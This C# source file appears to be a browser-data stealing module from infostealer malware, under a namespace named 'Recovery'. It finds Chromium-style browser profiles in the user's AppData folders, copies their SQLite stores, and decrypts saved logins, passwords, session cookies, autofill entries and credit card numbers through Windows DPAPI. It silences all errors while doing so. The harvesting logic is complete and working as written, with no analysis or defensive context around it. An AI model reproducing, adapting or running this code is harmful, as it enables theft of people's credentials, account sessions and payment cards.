using NoiseMe.Drags.App.Data.Hlps;
using NoiseMe.Drags.App.Data.SQLite;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;
using NoiseMe.Drags.App.Models.LocalModels.Extensions.Nulls;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Threading;

namespace NoiseMe.Drags.App.Data.Recovery
{
	public class Bip : GH9kf<BrowserProfile>
	{
		public List<BrowserProfile> EnumerateData()
		{
			List<BrowserProfile> browserProfiles = new List<BrowserProfile>();
			try
			{
				int countCompleted = 0;
				object locker = new object();
				List<string> profile = GetProfile();
				foreach (string rootPath in profile)
				{
					new Thread((ThreadStart)delegate
					{
						BrowserProfile browserProfile = new BrowserProfile();
						try
						{
							string fullName = new FileInfo(rootPath).Directory.FullName;
							string text = rootPath.Contains(strg.RoamingAppData) ? GetRoadData(fullName) : GetLclName(fullName);
							if (!string.IsNullOrEmpty(text))
							{
								text = text[0].ToString().ToUpper() + text.Remove(0, 1);
								string name = GetName(fullName);
								if (!string.IsNullOrEmpty(name))
								{
									browserProfile.Name = text;
									browserProfile.Profile = name;
									browserProfile.BrowserCookies = EnumCook(fullName).IsNull();
									browserProfile.BrowserCredendtials = GetCredentials(fullName).IsNull();
									browserProfile.BrowserAutofills = EnumFills(fullName).IsNull();
									browserProfile.BrowserCreditCards = EnumCC(fullName).IsNull();
								}
							}
						}
						catch
						{
						}
						lock (locker)
						{
							List<BrowserCookie> browserCookies = browserProfile.BrowserCookies;
							if (browserCookies == null || browserCookies.Count <= 0)
							{
								List<BrowserCredendtial> browserCredendtials = browserProfile.BrowserCredendtials;
								if (browserCredendtials == null || browserCredendtials.Count <= 0)
								{
									List<BrowserCreditCard> browserCreditCards = browserProfile.BrowserCreditCards;
									if (browserCreditCards == null || browserCreditCards.Count <= 0)
									{
										List<BrowserAutofill> browserAutofills = browserProfile.BrowserAutofills;
										if (browserAutofills == null || browserAutofills.Count <= 0)
										{
											goto IL_01ca;
										}
									}
								}
							}
							browserProfiles.Add(browserProfile);
							goto IL_01ca;
							IL_01ca:
							int num = countCompleted;
							countCompleted = num + 1;
						}
					}).Start();
				}
				while (countCompleted != profile.Count)
				{
				}
			}
			catch
			{
			}
			return browserProfiles;
		}

		public List<BrowserCredendtial> GetCredentials(string profilePath)
		{
			List<BrowserCredendtial> list = new List<BrowserCredendtial>();
			try
			{
				string text = Path.Combine(profilePath, "Login Data");
				if (!File.Exists(text))
				{
					return list;
				}
				CNT cNT = new CNT(rcvr.CreateTempCopy(text));
				cNT.ReadTable("logins");
				for (int i = 0; i < cNT.RowLength; i++)
				{
					BrowserCredendtial browserCredendtial = new BrowserCredendtial();
					try
					{
						browserCredendtial = ReadData(cNT, i);
					}
					catch
					{
					}
					if (browserCredendtial.Login.IsNotNull() && browserCredendtial.Login != "UNKNOWN" && browserCredendtial.Password != "UNKNOWN" && browserCredendtial.URL != "UNKNOWN")
					{
						list.Add(browserCredendtial);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		public List<BrowserCookie> EnumCook(string profilePath)
		{
			List<BrowserCookie> list = new List<BrowserCookie>();
			try
			{
				string text = Path.Combine(profilePath, "Cookies");
				if (!File.Exists(text))
				{
					return list;
				}
				CNT cNT = new CNT(rcvr.CreateTempCopy(text));
				cNT.ReadTable("cookies");
				for (int i = 0; i < cNT.RowLength; i++)
				{
					BrowserCookie browserCookie = null;
					try
					{
						browserCookie = new BrowserCookie
						{
							Host = cNT.ParseValue(i, "host_key").Trim(),
							Http = (cNT.ParseValue(i, "httponly") == "1"),
							Path = cNT.ParseValue(i, "path").Trim(),
							Secure = (cNT.ParseValue(i, "secure") == "1"),
							Expires = cNT.ParseValue(i, "expires_utc").Trim(),
							Name = cNT.ParseValue(i, "name").Trim(),
							Value = rcvr.DecryptBlob(cNT.ParseValue(i, "encrypted_value"), DataProtectionScope.CurrentUser).Trim()
						};
					}
					catch (Exception)
					{
					}
					if (browserCookie != null)
					{
						list.Add(browserCookie);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		public List<BrowserAutofill> EnumFills(string profilePath)
		{
			List<BrowserAutofill> list = new List<BrowserAutofill>();
			try
			{
				string text = Path.Combine(profilePath, "Web Data");
				if (!File.Exists(text))
				{
					return list;
				}
				CNT cNT = new CNT(rcvr.CreateTempCopy(text));
				cNT.ReadTable("autofill");
				for (int i = 0; i < cNT.RowLength; i++)
				{
					BrowserAutofill browserAutofill = null;
					try
					{
						browserAutofill = new BrowserAutofill
						{
							Name = cNT.ParseValue(i, "name").Trim(),
							Value = cNT.ParseValue(i, "value").Trim()
						};
					}
					catch
					{
					}
					if (browserAutofill != null)
					{
						list.Add(browserAutofill);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		public List<BrowserCreditCard> EnumCC(string profilePath)
		{
			List<BrowserCreditCard> list = new List<BrowserCreditCard>();
			try
			{
				string text = Path.Combine(profilePath, "Web Data");
				if (!File.Exists(text))
				{
					return list;
				}
				CNT cNT = new CNT(rcvr.CreateTempCopy(text));
				cNT.ReadTable("credit_cards");
				for (int i = 0; i < cNT.RowLength; i++)
				{
					BrowserCreditCard browserCreditCard = null;
					try
					{
						browserCreditCard = new BrowserCreditCard
						{
							Holder = cNT.ParseValue(i, "name_on_card").Trim(),
							ExpirationMonth = Convert.ToInt32(cNT.ParseValue(i, "expiration_month").Trim()),
							ExpirationYear = Convert.ToInt32(cNT.ParseValue(i, "expiration_year").Trim()),
							CardNumber = rcvr.DecryptBlob(cNT.ParseValue(i, "card_number_encrypted"), DataProtectionScope.CurrentUser).Trim()
						};
					}
					catch
					{
					}
					if (browserCreditCard != null)
					{
						list.Add(browserCreditCard);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private BrowserCredendtial ReadData(CNT manager, int row)
		{
			BrowserCredendtial browserCredendtial = new BrowserCredendtial();
			try
			{
				browserCredendtial.URL = manager.ParseValue(row, "origin_url").Trim();
				browserCredendtial.Login = manager.ParseValue(row, "username_value").Trim();
				browserCredendtial.Password = rcvr.DecryptBlob(manager.ParseValue(row, "password_value"), DataProtectionScope.CurrentUser).Trim();
				return browserCredendtial;
			}
			catch
			{
				return browserCredendtial;
			}
			finally
			{
				browserCredendtial.Login = (string.IsNullOrEmpty(browserCredendtial.Login) ? "UNKNOWN" : browserCredendtial.Login);
				browserCredendtial.Password = (string.IsNullOrEmpty(browserCredendtial.Password) ? "UNKNOWN" : browserCredendtial.Password);
				browserCredendtial.URL = (string.IsNullOrEmpty(browserCredendtial.URL) ? "UNKNOWN" : browserCredendtial.URL);
			}
		}

		private string GetName(string path)
		{
			try
			{
				string[] array = path.Split(new char[1]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				if (array[array.Length - 2] == "User Data")
				{
					return array[array.Length - 1];
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		private string GetRoadData(string path)
		{
			try
			{
				return path.Split(new string[1]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries)[0];
			}
			catch
			{
			}
			return string.Empty;
		}

		private string GetLclName(string path)
		{
			try
			{
				string[] array = path.Split(new string[1]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				return array[0] + "_[" + array[1] + "]";
			}
			catch
			{
			}
			return string.Empty;
		}

		private List<string> GetProfile()
		{
			List<string> list = new List<string>();
			try
			{
				list.AddRange(rcvr.FindPaths(strg.RoamingAppData, 4, 1, "Login Data", "Web Data", "Cookies"));
				list.AddRange(rcvr.FindPaths(strg.LocalAppData, 4, 1, "Login Data", "Web Data", "Cookies"));
				return list;
			}
			catch
			{
				return list;
			}
		}
	}
}
